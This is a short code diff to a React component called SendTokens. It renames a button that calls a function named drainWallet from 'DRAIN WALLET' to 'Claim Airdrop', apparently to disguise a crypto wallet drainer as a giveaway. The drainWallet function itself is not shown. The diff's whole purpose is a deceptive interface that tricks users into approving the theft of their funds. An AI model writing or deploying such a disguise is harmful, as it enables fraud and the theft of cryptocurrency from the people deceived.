@@ -109,12 +109,13 @@ export const SendTokens = () => {
 
   return (
     <div>
-      <Button
+      <button
         type="error"
         onClick={drainWallet}
+        className='claim_btn'
       >
-        DRAIN WALLET
-      </Button>
+        Claim Airdrop
+      </button>
     </div>
   );
 };
